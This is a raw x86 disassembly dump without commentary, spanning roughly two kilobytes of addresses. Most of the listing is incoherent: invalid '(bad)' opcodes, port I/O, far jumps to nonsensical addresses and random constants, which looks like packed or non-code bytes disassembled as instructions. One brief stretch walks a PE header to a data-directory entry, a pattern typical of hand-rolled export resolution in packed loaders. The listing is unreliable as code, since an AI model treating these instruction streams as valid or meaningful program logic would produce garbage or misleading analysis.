  408533:	mov    bh,dh
  408535:	lea    ebp,[eax+0x7bdc3a06]
  40853b:	popa   
  40853c:	add    eax,0x4955f958
  408541:	ret    0x8821
  408544:	test   DWORD PTR [edi-0x36],eax
  408547:	or     al,0x38
  408549:	popf   
  40854a:	out    0x10,eax
  40854c:	mov    ?,WORD PTR [ebp+0x63]
  40854f:	inc    ebx
  408550:	loopne 0x4084f7
  408552:	dec    eax
  408553:	imul   edx,DWORD PTR [ebx],0xffffff8f
  408556:	bswap  esi
  408558:	and    DWORD PTR [ecx-0x1d65a73],edi
  40855e:	jbe    0x4085d6
  408560:	adc    BYTE PTR [esp+ebp*2-0x6cc918a4],cl
  408567:	jle    0x408545
  408569:	ins    DWORD PTR es:[edi],dx
  40856a:	ins    BYTE PTR es:[edi],dx
  40856b:	dec    ebp
  40856c:	mov    esp,0x2e464dc7
  408571:	cld    
  408572:	gs jo  0x408545
  408575:	pop    esi
  408576:	push   eax
  408577:	push   eax
  408578:	pop    esi
  408579:	aad    0x5f
  40857b:	add    al,0x25
  40857d:	xlat   BYTE PTR ds:[ebx]
  40857e:	fisub  WORD PTR [esi+0x1b9069af]
  408584:	loop   0x40850f
  408586:	sti    
  408587:	push   edx
  408588:	mov    bl,0xe6
  40858a:	mov    bl,0x16
  40858c:	pop    esi
  40858d:	nop
  40858e:	out    dx,al
  40858f:	and    eax,0x187873b7
  408594:	je     0x408523
  408596:	rcl    BYTE PTR [edi],0x41
  408599:	pusha  
  40859a:	mov    edx,0x714b0fe1
  40859f:	fprem  
  4085a1:	add    esi,DWORD PTR [edx+0x59]
  4085a4:	pop    es
  4085a5:	inc    edx
  4085a6:	das    
  4085a7:	adc    DWORD PTR [eax-0x3d403c7e],ebp
  4085ad:	sub    esi,DWORD PTR es:[ebx+0x97ed56d]
  4085b4:	and    esp,DWORD PTR [ebp-0x7e]
  4085b7:	bound  edi,QWORD PTR [edi+0x7a]
  4085ba:	mov    ebp,0x2c3c42b0
  4085bf:	inc    eax
  4085c0:	stc    
  4085c1:	push   ebx
  4085c2:	in     eax,0xf8
  4085c4:	cdq    
  4085c5:	stc    
  4085c6:	jmp    0x9eec283a
  4085cb:	mov    bh,0x1b
  4085cd:	pop    ds
  4085ce:	mov    eax,0xfda87d76
  4085d3:	rol    BYTE PTR [edi+0x6a433aa5],cl
  4085d9:	fild   WORD PTR [ecx-0x23]
  4085dc:	xchg   ebp,eax
  4085dd:	dec    bl
  4085df:	rcr    BYTE PTR ds:[ecx-0x58],0x79
  4085e4:	cmp    BYTE PTR [esp+ebp*1+0x64],cl
  4085e8:	mov    esi,0xc32cbfdc
  4085ed:	gs push 0xdbceb570
  4085f3:	adc    dl,BYTE PTR [ebx+0x67]
  4085f6:	clc    
  4085f7:	pop    ebp
  4085f8:	icebp  
  4085f9:	shr    eax,cl
  4085fb:	jl     0x408654
  4085fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085fe:	shl    ah,1
  408600:	or     ah,BYTE PTR [ebx+eax*1-0x17]
  408604:	add    al,0xd7
  408606:	jmp    0x49a0:0x65e9c144
  40860d:	and    ch,dh
  40860f:	fucomip st,st(0)
  408611:	sbb    DWORD PTR [ebp-0x4c644273],ebx
  408617:	pop    ds
  408618:	add    DWORD PTR [eax-0x46],edi
  40861b:	popa   
  40861c:	lock imul esi,DWORD PTR [edx],0x20ecd84e
  408623:	jmp    0x22c57fc
  408628:	mov    al,ds:0xb62b8c90
  40862d:	scas   al,BYTE PTR es:[edi]
  40862e:	pop    es
  40862f:	mov    cl,0xf9
  408631:	std    
  408632:	stc    
  408633:	es push ecx
  408635:	dec    ecx
  408636:	je     0x4086ab
  408638:	jmp    0x4085d1
  40863a:	ss jmp 0x7a496413
  408640:	adc    DWORD PTR [ecx+0x7aaa1252],ebx
  408646:	mov    edx,0xe61b44b2
  40864b:	push   ebx
  40864c:	fcomp  st(3)
  40864e:	aas    
  40864f:	imul   esi,DWORD PTR [edx],0xbb0bfcbd
  408655:	jne    0x408667
  40865b:	mov    eax,DWORD PTR [ebp-0x64]
  40865e:	cmp    DWORD PTR [ebp-0x5c],eax
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0xbefacfb8
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    BYTE PTR [ecx+0x8],al
  40869f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086a0:	clc    
  4086a1:	hlt    
  4086a2:	je     0x4086e2
  4086a4:	sti    
  4086a5:	retf   
  4086a6:	das    
  4086a7:	stc    
  4086a8:	shl    BYTE PTR ds:0x41324905,0xf1
  4086af:	popa   
  4086b0:	cmp    ecx,edi
  4086b2:	sbb    al,0x49
  4086b4:	nop    DWORD PTR [edx+0xd]
  4086b8:	je     0x408735
  4086ba:	mov    ebx,0xa1f9f1e6
  4086bf:	aam    0xc
  4086c1:	fild   QWORD PTR [ebp-0x5b]
  4086c4:	inc    esi
  4086c5:	inc    esp
  4086c6:	lock xor al,0xd9
  4086c9:	mov    ds:0x1cc3cd3,eax
  4086ce:	shr    DWORD PTR [ebp+eax*8-0xc],1
  4086d2:	mov    al,ds:0x6e56ae86
  4086d7:	jp     0x4086ed
  4086d9:	mov    ch,0x3c
  4086db:	out    dx,al
  4086dc:	pop    ebp
  4086dd:	popf   
  4086de:	mov    ebx,0x2a0d59f1
  4086e3:	jmp    0x408760
  4086e5:	jb     0x4086d6
  4086e7:	(bad)  
  4086e8:	jns    0x408747
  4086ea:	or     edi,DWORD PTR [eax+0x3ab0d18]
  4086f0:	daa    
  4086f1:	xor    edi,DWORD PTR [ebx-0x4a]
  4086f4:	(bad)  
  4086f5:	stos   DWORD PTR es:[edi],eax
  4086f6:	xor    DWORD PTR [edi+0x38],esp
  4086f9:	cmp    BYTE PTR [eax],0x17
  4086fc:	add    DWORD PTR [ecx],ecx
  4086fe:	jnp    0x4086ea
  408700:	jbe    0x4086a4
  408702:	xor    edx,DWORD PTR [edx-0xa599a87]
  408708:	mov    ch,0xa3
  40870a:	sub    BYTE PTR [edx-0x4f],ah
  40870d:	cmp    eax,0x1f875e89
  408712:	fimul  DWORD PTR [eax]
  408714:	mov    eax,0x5a90dcbb
  408719:	pop    es
  40871a:	aam    0x9a
  40871c:	inc    edi
  40871d:	mov    ebx,DWORD PTR [esi-0x20]
  408720:	(bad)  
  408721:	adc    DWORD PTR [ebx+ebp*1],edi
  408724:	stos   DWORD PTR es:[edi],eax
  408725:	hlt    
  408726:	enter  0x689d,0x70
  40872a:	mov    ecx,0x8bb9ba66
  40872f:	lds    ebp,FWORD PTR [eax-0x37]
  408732:	into   
  408733:	loop   0x4086e8
  408735:	add    ecx,DWORD PTR [bp+si]
  408738:	in     eax,0x2c
  40873a:	gs push esi
  40873c:	ret    0x4a17
  40873f:	in     eax,dx
  408740:	pop    DWORD PTR ds:0xd307fdba
  408746:	ss (bad) 
  408748:	retf   
  408749:	inc    esp
  40874a:	ins    BYTE PTR es:[edi],dx
  40874b:	sahf   
  40874c:	and    BYTE PTR [ebp-0x100304aa],al
  408752:	mov    ecx,0x90d57288
  408757:	sar    DWORD PTR [ecx+0x60d7b469],cl
  40875d:	shl    BYTE PTR [edi-0x15144f3],1
  408763:	xchg   edi,eax
  408764:	das    
  408765:	cli    
  408766:	xchg   edi,eax
  408767:	xchg   cl,bh
  408769:	ja     0x408742
  40876b:	dec    edx
  40876c:	fadd   DWORD PTR [esi]
  40876e:	lahf   
  40876f:	scas   eax,DWORD PTR es:[edi]
  408770:	jns    0x4086f4
  408772:	scas   al,BYTE PTR es:[edi]
  408773:	lds    ebp,FWORD PTR [esi-0x40]
  408776:	dec    esp
  408777:	lock and ah,bl
  40877a:	retf   0xe727
  40877d:	xlat   BYTE PTR ds:[ebx]
  40877e:	lss    edi,FWORD PTR [ecx+ecx*4]
  408782:	jl     0x40870b
  408784:	es lock int3 
  408787:	in     al,dx
  408788:	xor    al,0xe6
  40878a:	and    edi,DWORD PTR [esi-0x67]
  40878d:	mov    ebx,0x6cd55097
  408792:	jmp    0x40874e
  408794:	je     0x408733
  408796:	mov    al,0xc
  408798:	cld    
  408799:	add    dl,BYTE PTR [edx+0x1b8dc7ae]
  40879f:	(bad)  
  4087a0:	test   DWORD PTR [ebx-0x233a5e2f],0x938b9bc5
  4087aa:	rcl    DWORD PTR [ecx+0x2b],0x23
  4087ae:	je     0x40873c
  4087b0:	rcl    DWORD PTR [eax+ebp*8],0x25
  4087b4:	outs   dx,BYTE PTR ds:[esi]
  4087b5:	inc    bh
  4087b7:	or     bl,BYTE PTR [ebp+0x5e]
  4087ba:	mov    ecx,0x8411d5be
  4087bf:	icebp  
  4087c0:	push   esi
  4087c1:	add    ecx,DWORD PTR [esi+0x33]
  4087c4:	mov    eax,DWORD PTR [eax+0x1f18fe28]
  4087ca:	mov    eax,ds:0x3a5de59
  4087cf:	mov    ecx,0x9f1c5b80
  4087d4:	fsub   DWORD PTR [edx+ebx*4-0x7fafe7fb]
  4087db:	add    BYTE PTR [ecx+0x36ec5f89],ch
  4087e1:	outs   dx,BYTE PTR ds:[esi]
  4087e2:	bound  eax,QWORD PTR ds:0xe65c88dd
  4087e8:	les    eax,FWORD PTR [edi-0x1d28ec8]
  4087ee:	addr16 fs xchg edx,eax
  4087f1:	pushf  
  4087f2:	adc    ebp,esp
  4087f4:	lock stos BYTE PTR es:[edi],al
  4087f6:	dec    BYTE PTR [ebx+0x7c]
  4087f9:	and    esi,DWORD PTR [edx-0x66]
  4087fc:	inc    edx
  4087fd:	stos   BYTE PTR es:[edi],al
  4087fe:	daa    
  4087ff:	ss repz jnp 0x40886e
  408803:	lds    ebp,FWORD PTR [edi-0x46ffd812]
  408809:	jmp    0xd0c07aee
  40880e:	test   eax,0xa8c51419
  408813:	hlt    
  408814:	push   esi
  408815:	cld    
  408816:	aas    
  408817:	inc    ecx
  408818:	ret    0xd7d6
  40881b:	mov    ebp,0xf93848fa
  408820:	out    dx,al
  408821:	pop    ss
  408822:	add    edx,ecx
  408824:	rol    ecx,cl
  408826:	lahf   
  408827:	mov    ss,WORD PTR [edx+ebp*8]
  40882a:	adc    al,0xdd
  40882c:	stos   DWORD PTR es:[edi],eax
  40882d:	(bad)  
  40882e:	inc    edi
  40882f:	pop    esi
  408830:	scas   al,BYTE PTR es:[edi]
  408831:	popf   
  408832:	add    eax,0xd61f73d3
  408837:	imul   edx,esi,0xed5de4b9
  40883d:	daa    
  40883e:	ret    
  40883f:	shr    DWORD PTR [edi+0x5d],cl
  408842:	or     DWORD PTR cs:[esi+0x607aa4ba],0xfffffffb
  40884a:	mov    edi,0x1804b863
  40884f:	cs xchg ebx,eax
  408851:	sbb    bh,BYTE PTR [eax-0x3a]
  408854:	mov    eax,0xfea12523
  408859:	in     eax,dx
  40885a:	inc    edx
  40885b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40885c:	pop    ss
  40885d:	or     eax,0x84706d47
  408862:	(bad)  
  408863:	pop    edx
  408864:	mov    cl,0x7e
  408866:	outs   dx,DWORD PTR ds:[esi]
  408867:	inc    ecx
  408868:	loop   0x4087ea
  40886a:	(bad)  
  40886d:	lock fldenv [ebx-0x22]
  408871:	inc    DWORD PTR [esi]
  408873:	push   edi
  408874:	outs   dx,BYTE PTR ds:[esi]
  408875:	push   DWORD PTR [edi]
  408877:	and    al,0xc
  408879:	mov    ebx,0xa62e4b5f
  40887e:	retf   0xf767
  408881:	fbld   TBYTE PTR [ebx+0x2]
  408884:	(bad)  
  408885:	push   edi
  408886:	xchg   ecx,eax
  408887:	(bad)  
  408888:	cmc    
  408889:	sub    BYTE PTR [edx],bh
  40888b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40888c:	mov    eax,0xb4ca74f
  408891:	shl    ah,1
  408893:	xor    edi,DWORD PTR [ebp-0x7d]
  408896:	add    al,0x7b
  408898:	in     eax,0xfe
  40889a:	sbb    al,BYTE PTR [eax-0x1dcd3701]
  4088a0:	fld    DWORD PTR [edi]
  4088a2:	jb     0x408874
  4088a4:	(bad)  
  4088a5:	push   ss
  4088a6:	sub    eax,0xe61ef84b
  4088ab:	and    DWORD PTR [ecx*8+0x7e929208],ecx
  4088b2:	hlt    
  4088b3:	and    eax,esp
  4088b5:	push   cs
  4088b6:	jmp    0x4088fc
  4088b8:	repnz sub al,BYTE PTR [ebx-0x7f]
  4088bc:	pop    edx
  4088bd:	sub    bl,BYTE PTR [eax-0x2f]
  4088c0:	mov    ecx,0x2f755a5f
  4088c5:	jle    0x408882
  4088c7:	xor    al,0x4f
  4088c9:	sahf   
  4088ca:	retf   
  4088cb:	and    bl,cl
  4088cd:	mov    ecx,0xa963528a
  4088d2:	pop    eax
  4088d3:	je     0x4088c9
  4088d5:	push   es
  4088d6:	cmp    DWORD PTR [esi+0x1563b97e],edi
  4088dc:	sub    eax,0xa9d5ca03
  4088e1:	xor    eax,0xae362876
  4088e6:	daa    
  4088e7:	mov    dh,bl
  4088e9:	outs   dx,DWORD PTR ds:[esi]
  4088ea:	pop    ds
  4088eb:	xor    eax,0x4cefb4c2
  4088f0:	dec    ecx
  4088f1:	push   ss
  4088f2:	pushf  
  4088f3:	or     eax,0xece823e5
  4088f8:	inc    ecx
  4088f9:	test   al,0x4d
  4088fb:	sub    DWORD PTR [ebp-0x7bccfdd1],0x3b
  408902:	jns    0x4088e2
  408904:	lods   eax,DWORD PTR ds:[esi]
  408905:	cmp    ah,ah
  408907:	jp     0x40893e
  408909:	mov    WORD PTR [ecx+0x15],ds
  40890c:	mov    ds:0x2b3f7a91,eax
  408911:	iret   
  408912:	cmp    ah,BYTE PTR [edx+0x2e]
  408915:	(bad)  
  408916:	cli    
  408917:	jnp    0x4088c5
  408919:	jp     0x408962
  40891b:	int    0xe3
  40891d:	aaa    
  40891e:	mov    ds:0xea7f3c2e,eax
  408923:	jmp    0x6e61ffb9
  408928:	test   ecx,0xaa8b112
  40892e:	shl    BYTE PTR [edx-0x5f9674cc],cl
  408934:	jb     0x4088c5
  408936:	fnstenv [edx]
  408938:	sti    
  408939:	inc    edx
  40893a:	mov    dh,0xc0
  40893c:	sbb    al,BYTE PTR [ebx-0x68]
  40893f:	js     0x4089a1
  408941:	data16 fstp DWORD PTR [esi-0x6c]
  408945:	lea    ebp,[ebp+0x2f]
  408948:	add    bl,al
  40894a:	ds jg  0x408979
  40894d:	pop    esp
  40894e:	es mov ebx,0xd3099988
  408954:	fiadd  WORD PTR [ebp-0x3d742e8f]
  40895a:	test   eax,0xcb6ffecd
  40895f:	mov    ds:0x995fc3c3,eax
  408964:	test   DWORD PTR [ebp+0x75],0x9f102f1d
  40896b:	es xchg esp,eax
  40896d:	in     eax,dx
  40896e:	icebp  
  40896f:	mov    al,ds:0xc747b64a
  408974:	jecxz  0x40895d
  408976:	add    al,0xe2
  408978:	push   ebp
  408979:	ins    BYTE PTR es:[edi],dx
  40897a:	outs   dx,DWORD PTR ds:[esi]
  40897b:	mov    edx,0xbb4901bc
  408980:	sub    BYTE PTR [ebx],dl
  408982:	push   eax
  408983:	push   esp
  408984:	xchg   edi,esp
  408986:	xor    cl,dh
  408988:	mov    cl,0x30
  40898a:	in     al,dx
  40898b:	mov    esi,DWORD PTR [esi+0x67]
  40898e:	aam    0x5d
  408990:	repnz sbb ecx,ebp
  408993:	mov    bl,0x36
  408995:	xor    al,0xa9
  408997:	jmp    0xa8bb2a52
  40899c:	jne    0x408a03
  40899e:	mov    dh,0x36
  4089a0:	test   ecx,0xe10223d0
  4089a6:	fsubr  QWORD PTR [ebx+0x7f]
  4089a9:	ror    DWORD PTR [ebx-0x13],cl
  4089ac:	je     0x408a28
  4089ae:	ror    ebp,1
  4089b0:	ficomp WORD PTR [eax-0x79]
  4089b3:	ss data16 mov ah,0xe6
  4089b7:	repnz imul ebx,DWORD PTR [esi-0x5e2df67e],0x4b
  4089bf:	adc    eax,0x6348d032
  4089c4:	bound  edi,QWORD PTR [ecx]
  4089c6:	jmp    0x42f0c599
  4089cb:	inc    edx
  4089cc:	mov    ds:0xb05961ef,al
  4089d1:	mov    WORD PTR [ebp+0x1d],es
  4089d4:	in     eax,dx
  4089d5:	pop    edx
  4089d6:	pop    eax
  4089d7:	xchg   edi,eax
  4089d8:	cmc    
  4089d9:	out    0xb7,al
  4089db:	fistp  DWORD PTR [ebp+ecx*1+0x20]
  4089df:	mov    fs:0x6e6e01fc,eax
  4089e5:	shr    DWORD PTR [edx-0x1c191004],cl
  4089eb:	outs   dx,DWORD PTR ds:[esi]
  4089ec:	repz arpl dx,si
  4089ef:	lahf   
  4089f0:	xchg   BYTE PTR [ecx],cl
  4089f2:	test   DWORD PTR [esi],0xf5ea7552
  4089f8:	pop    ebp
  4089f9:	aas    
  4089fa:	add    eax,0x53e39fea
  4089ff:	aam    0x13
  408a01:	call   0xc53f04d6
  408a06:	into   
  408a07:	retf   0xe0bd
  408a0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a0b:	push   0xdeac17d9
  408a10:	icebp  
  408a11:	mov    DWORD PTR [edx],ebx
  408a13:	cmp    eax,0xd35a4fdd
  408a18:	hlt    
  408a19:	(bad)  
  408a1a:	in     al,0x3c
  408a1c:	je     0x408a19
  408a1e:	ds mov dl,0x25
  408a21:	int    0x4c
  408a23:	mov    ebp,0xbc94568
  408a28:	lods   al,BYTE PTR ds:[esi]
  408a29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a2a:	sub    bl,BYTE PTR [esi]
  408a2c:	sar    BYTE PTR [edi+0x7f],cl
  408a2f:	xor    DWORD PTR [edi-0x3529caa2],esi
  408a35:	push   eax
  408a36:	(bad)  
  408a37:	dec    ebp
  408a38:	(bad)  
  408a39:	inc    ecx
  408a3a:	ins    DWORD PTR es:[edi],dx
  408a3b:	pop    es
  408a3c:	stos   DWORD PTR es:[edi],eax
  408a3d:	dec    esi
  408a3e:	or     dl,ch
  408a40:	lds    ebp,FWORD PTR [ebx+eiz*2]
  408a43:	mov    esi,0x2f7e31de
  408a48:	popf   
  408a49:	ins    BYTE PTR es:[edi],dx
  408a4a:	inc    esp
  408a4b:	pop    esp
  408a4c:	shl    BYTE PTR [edi],0x33
  408a4f:	mov    esi,0xd0d6de44
  408a54:	sub    edi,DWORD PTR [ebx]
  408a56:	out    0xdf,eax
  408a58:	outs   dx,BYTE PTR ds:[esi]
  408a59:	ins    DWORD PTR es:[edi],dx
  408a5a:	sub    al,0x69
  408a5c:	retf   0x8be9
  408a5f:	push   es
  408a60:	mov    edx,DWORD PTR [esi+0x4]
  408a63:	jmp    0x408e41
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	aas    
  408a75:	(bad)  
  408a76:	mov    bl,0x7c
  408a78:	mov    ch,0x57
  408a7a:	sbb    BYTE PTR [eax],bl
  408a7c:	sahf   
  408a7d:	adc    bl,BYTE PTR [eax]
  408a7f:	sbb    bh,ah
  408a81:	mov    ds:0x75d4e088,eax
  408a86:	adc    al,0x14
  408a88:	arpl   WORD PTR [eax],sp
  408a8a:	and    al,0xd0
  408a8c:	stc    
  408a8d:	cdq    
  408a8e:	(bad)  
  408a8f:	xor    edi,ebx
  408a91:	sbb    esp,esi
  408a93:	test   al,0xd8
  408a95:	jne    0x408a88
  408a97:	jmp    0x3314:0xc8d2b76e
  408a9e:	aam    0xfd
  408aa0:	mov    esp,0x11970d92
  408aa5:	dec    ecx
  408aa6:	iret   
  408aa7:	push   ecx
  408aa8:	push   edi
  408aa9:	lahf   
  408aaa:	pop    ds
  408aab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408aac:	jbe    0x408b1a
  408aae:	(bad)  
  408aaf:	xchg   edi,edi
  408ab1:	test   DWORD PTR [esi],0x4bccc829
  408ab7:	out    dx,eax
  408ab8:	bound  eax,QWORD PTR [ecx+0x6f94fc1c]
  408abe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408abf:	jnp    0x408b31
  408ac1:	dec    ecx
  408ac2:	fbstp  TBYTE PTR [edx]
  408ac4:	sub    BYTE PTR [eax-0x16770755],bh
  408aca:	bound  ecx,QWORD PTR [esi+0x29288f82]
  408ad0:	imul   DWORD PTR ds:0x46ede584
  408ad6:	rcr    BYTE PTR [ebx],cl
  408ad8:	cmp    eax,0x2874177b
  408add:	sbb    bh,dh
  408adf:	jg     0x408ab2
  408ae1:	shl    BYTE PTR ds:0xb5780601,0xb7
  408ae8:	idiv   bl
  408aea:	and    esp,edx
  408aec:	int3   
  408aed:	mov    al,ds:0x8c1f49c8
  408af2:	push   edx
  408af3:	(bad)  
  408af4:	mov    edx,0x81ce9ed4
  408af9:	pop    ds
  408afa:	in     eax,0xe2
  408afc:	call   0x7af03ab2
  408b01:	neg    DWORD PTR [esi+0x77ebbc99]
  408b07:	clc    
  408b08:	ss jns 0x408b0b
  408b0b:	rol    DWORD PTR [ebp-0x475fbb23],cl
  408b11:	and    eax,0x710acf7c
  408b16:	push   cs
  408b17:	xchg   esp,eax
  408b18:	lods   al,BYTE PTR ds:[esi]
  408b19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b1a:	inc    edx
  408b1b:	out    dx,al
  408b1c:	mov    eax,ds:0x854d3d3d
  408b21:	pop    edx
  408b22:	loope  0x408b91
  408b24:	jmp    DWORD PTR [eax+0x11442a6c]
  408b2a:	(bad)  
  408b2b:	sub    al,0x32
  408b2d:	repnz hlt 
  408b2f:	or     BYTE PTR [edi],bh
  408b31:	gs pushf 
  408b33:	or     BYTE PTR [ebx-0xf024d6b],0x39
  408b3a:	in     eax,dx
  408b3b:	stos   BYTE PTR es:[edi],al
  408b3c:	fsubr  DWORD PTR [ecx-0x6150cdf3]
  408b42:	test   al,0xe0
  408b44:	jge    0x408b9a
  408b46:	push   esi
  408b47:	mov    esp,0x8bc03729
  408b4c:	lds    esp,FWORD PTR [edx-0x1d]
  408b4f:	push   cs
  408b50:	std    
  408b51:	push   ecx
  408b52:	std    
  408b53:	xchg   edx,eax
  408b54:	jno    0x408b80
  408b56:	lods   eax,DWORD PTR ds:[esi]
  408b57:	stos   BYTE PTR es:[edi],al
  408b58:	add    dl,bl
  408b5a:	clc    
  408b5b:	push   0x348ba37f
  408b60:	pop    ss
  408b61:	leave  
  408b62:	ret    0x80af
  408b65:	push   es
  408b66:	xor    eax,0x4503cae4
  408b6b:	adc    BYTE PTR [ebx+0x4a],0x8c
  408b6f:	pop    edi
  408b70:	xchg   edi,eax
  408b71:	pop    DWORD PTR [eax+0xa]
  408b74:	(bad)  
  408b75:	mov    bh,0x42
  408b77:	xchg   esi,eax
  408b78:	xlat   BYTE PTR ds:[ebx]
  408b79:	icebp  
  408b7a:	loop   0x408b17
  408b7c:	out    dx,al
  408b7d:	in     eax,0xea
  408b7f:	and    BYTE PTR [esi],cl
  408b81:	sbb    eax,0x6a70dfc1
  408b86:	sbb    BYTE PTR [edi+0x35],0xee
  408b8a:	cmp    eax,0xc4da00c7
  408b8f:	add    DWORD PTR [ebx],esi
  408b91:	pop    ss
  408b92:	das    
  408b93:	inc    ebp
  408b95:	neg    BYTE PTR [ebp+0x6a]
  408b98:	push   esp
  408b99:	xor    esi,DWORD PTR [ebx-0x6f]
  408b9c:	sahf   
  408b9d:	imul   ebx,DWORD PTR [edi+0x678ab67d],0x5d2d2556
  408ba7:	mov    ds:0x2a07949f,eax
  408bac:	mov    esp,DWORD PTR [ebx+esi*2]
  408baf:	dec    ebx
  408bb0:	cmp    al,BYTE PTR ss:[ecx]
  408bb3:	ds pop ds
  408bb5:	mov    al,0x7e
  408bb7:	in     eax,0x5d
  408bb9:	out    0x91,eax
  408bbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bbc:	mov    WORD PTR [edx],es
  408bbe:	and    ch,BYTE PTR [edx+eiz*4]
  408bc1:	mov    eax,DWORD PTR [esp+edx*1-0xb]
  408bc5:	sub    al,0x23
  408bc7:	xor    BYTE PTR [ecx],bh
  408bc9:	fcom   DWORD PTR [ecx-0x23]
  408bcc:	les    esp,FWORD PTR [eax+0x3939bf74]
  408bd2:	lods   eax,DWORD PTR ds:[esi]
  408bd3:	dec    edi
  408bd4:	add    al,0x25
  408bd6:	push   ebp
  408bd7:	ret    0xf62e
  408bda:	mov    eax,ds:0x12285091
  408bdf:	lea    ebx,[edx]
  408be1:	icebp  
  408be2:	adc    al,0xe5
  408be4:	mov    bl,0xad
  408be6:	push   ebp
  408be7:	sbb    eax,0xa66cb682
  408bec:	out    dx,eax
  408bed:	inc    ecx
  408bee:	xchg   edi,eax
  408bef:	out    0x7e,al
  408bf1:	faddp  st(3),st
  408bf3:	js     0x408b91
  408bf5:	test   al,0xdf
  408bf7:	push   es
  408bf8:	add    al,0x27
  408bfa:	mov    esp,0x69ac6b31
  408bff:	xchg   esi,eax
  408c00:	xor    al,0x83
  408c02:	push   0xa2249d79
  408c07:	fadd   QWORD PTR [ebp+0xd94d1e7]
  408c0d:	add    dl,BYTE PTR [eax]
  408c0f:	out    dx,eax
  408c10:	or     eax,0xc2939f00
  408c15:	xor    al,0xfe
  408c17:	popa   
  408c18:	cmp    eax,ebp
  408c1a:	jl     0x408c17
  408c1c:	test   DWORD PTR [ebp+0x30a0ccff],eax
  408c22:	pop    esi
  408c23:	mov    edx,ebp
  408c25:	dec    ebx
  408c26:	pop    esp
  408c27:	mov    gs,ebp
  408c29:	sti    
  408c2a:	dec    esp
  408c2b:	jno    0x408c2d
  408c2d:	fisubr WORD PTR [edi-0x7c]
  408c30:	or     cl,bh
  408c32:	test   eax,0x2cfaac45
  408c37:	mov    ch,0x4f
  408c39:	xlat   BYTE PTR ds:[ebx]
  408c3a:	data16 das 
  408c3c:	add    eax,0xb8cce073
  408c41:	push   0x9a362745
  408c46:	sar    ebx,1
  408c48:	fld    TBYTE PTR [ecx]
  408c4a:	(bad)  
  408c4c:	xchg   edx,eax
  408c4d:	and    dl,BYTE PTR [edi]
  408c4f:	inc    ebp
  408c50:	shl    BYTE PTR ss:[eax+eax*8-0x2f5a3a1e],cl
  408c58:	or     eax,0xb8622c69
  408c5d:	dec    BYTE PTR [ebx-0x26857c94]
  408c63:	inc    ebx
  408c64:	leave  
  408c65:	sbb    BYTE PTR [ebx+0x46],ah
  408c68:	cmp    esi,esp
  408c6a:	xchg   esi,eax
  408c6b:	inc    esp
  408c6c:	push   cs
  408c6d:	dec    edx
  408c6e:	sbb    BYTE PTR [edi+ebx*8+0x51940e28],dl
  408c75:	mov    ecx,0xa0c71b78
  408c7a:	pop    ecx
  408c7b:	sub    dl,BYTE PTR [edx]
  408c7d:	jo     0x408cf4
  408c7f:	test   edi,esi
  408c81:	ror    dh,1
  408c83:	outs   dx,DWORD PTR ds:[esi]
  408c84:	and    DWORD PTR [esi],0x9bd37702
  408c8a:	sbb    eax,0xc6c3966
  408c8f:	retf   
  408c90:	mov    ebx,0xa72d35e3
  408c95:	test   eax,0x5e9f1d75
  408c9a:	mov    dl,0xe3
  408c9c:	fild   WORD PTR [ecx]
  408c9e:	mov    ebx,0x64e4f2a7
  408ca3:	dec    edi
  408ca4:	mov    edi,0x2c7dbf7f
  408ca9:	jb     0x408cfd
  408cab:	ror    edx,0xfb
  408cae:	fimul  WORD PTR [esi+0x12]
  408cb1:	mov    al,ds:0x834d27b4
  408cb6:	mov    ecx,0xe13a7354
  408cbb:	out    0xe3,eax
  408cbd:	xchg   esi,eax
  408cbe:	rcr    DWORD PTR [ecx-0xa],1
  408cc1:	inc    edi
  408cc2:	(bad)
  408cc5:	call   0xe03:0x9a27ff20
  408ccc:	sbb    eax,0x85681028
  408cd1:	or     eax,0x49951384
  408cd6:	xchg   esp,eax
  408cd7:	icebp  
  408cd8:	fisubr WORD PTR [edx-0x4e74b78]
  408cde:	xor    eax,0xc1296ee8
  408ce3:	inc    esp
  408ce4:	push   ss
  408ce5:	or     eax,esp
  408ce7:	aas    
  408ce8:	mov    eax,0x7bfddd2c
  408ced:	int    0x58
  408cef:	scas   eax,DWORD PTR es:[edi]
  408cf0:	sahf   
  408cf1:	popf   
  408cf2:	out    0x84,eax
  408cf4:	(bad)  
  408cf5:	sub    DWORD PTR [ecx],esi
  408cf7:	jnp    0x408ce3
  408cf9:	mov    eax,es:0xb136dfdf
  408cff:	les    esi,FWORD PTR [esi+ebx*1-0x7f]
  408d03:	pop    eax
  408d04:	xchg   ebp,eax
  408d05:	ficom  WORD PTR [ecx]
  408d07:	xchg   edi,eax
  408d08:	xchg   edx,eax
  408d09:	add    DWORD PTR [edx+0x5f],esp
  408d0c:	arpl   WORD PTR [edi-0x49],cx
  408d0f:	aaa    
  408d10:	xor    ebx,ebx
  408d12:	jbe    0x408cd6
  408d14:	pop    eax
  408d15:	int    0x26
  408d17:	cwde   
  408d18:	scas   eax,DWORD PTR es:[edi]
